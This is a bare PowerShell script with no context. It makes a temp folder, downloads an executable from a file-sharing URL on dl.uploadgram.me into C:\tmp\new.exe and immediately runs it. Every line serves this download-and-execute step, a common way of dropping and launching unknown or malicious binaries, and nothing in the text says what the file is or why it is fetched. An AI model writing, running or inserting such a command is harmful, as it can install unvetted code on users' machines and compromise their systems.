﻿mkdir C:\tmp
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest https://dl.uploadgram.me/627464da2431fh?raw -OutFile C:\tmp\new.exe
cd C:\tmp
cmd.exe /c "C:\tmp\new.exe"
exit


